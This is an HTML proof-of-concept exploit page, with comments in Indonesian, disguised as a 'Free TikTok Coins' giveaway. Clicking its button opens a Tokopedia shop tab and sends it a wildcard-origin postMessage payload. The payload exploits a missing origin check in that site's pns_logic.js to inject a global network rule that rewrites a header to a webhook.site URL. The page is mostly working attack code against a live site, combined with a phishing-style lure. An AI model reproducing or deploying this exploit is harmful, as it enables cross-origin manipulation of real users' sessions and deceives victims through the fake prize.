<!DOCTYPE html>
<html>
<head>
    <title>Free TikTok Coins!</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #fe2c55; color: white; border: none; border-radius: 5px; }
    </script>
</head>
<body>
    <h1>Congratulations! 🎁</h1>
    <p>You've won 1000 TikTok Coins. Click below to claim!</p>
    
    <button onclick="attack()">CLAIM NOW</button>

    <script>
        function attack() {
            // 1. Buka halaman target di tab baru
            const targetWin = window.open("https://shop-id.tokopedia.com", "_blank");

            // 2. Tunggu tab tersebut loading (sekitar 3-4 detik)
            setTimeout(function() {
                const payload = {
                    source: "main_thread", // Sesuai pengecekan di pns_logic.js
                    eventName: "network_rule",
                    data: [{
                        ruleName: "exploit_origin_bypass",
                        global: true,
                        conditions: [],
                        handlers: [{
                            handler: "replace",
                            type: "header",
                            field: "X-Pns-Referrer",
                            value: "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"
                        }]
                    }]
                };

                // 3. Kirim postMessage ke tab target. 
                // Karena pns_logic.js gak cek event.origin, payload ini bakal DITERIMA.
                targetWin.postMessage(payload, "*");
                
                alert("Exploit Sent! Now check the Network tab on the Tokopedia tab.");
            }, 4000);
        }
    </script>
</body>
</html>
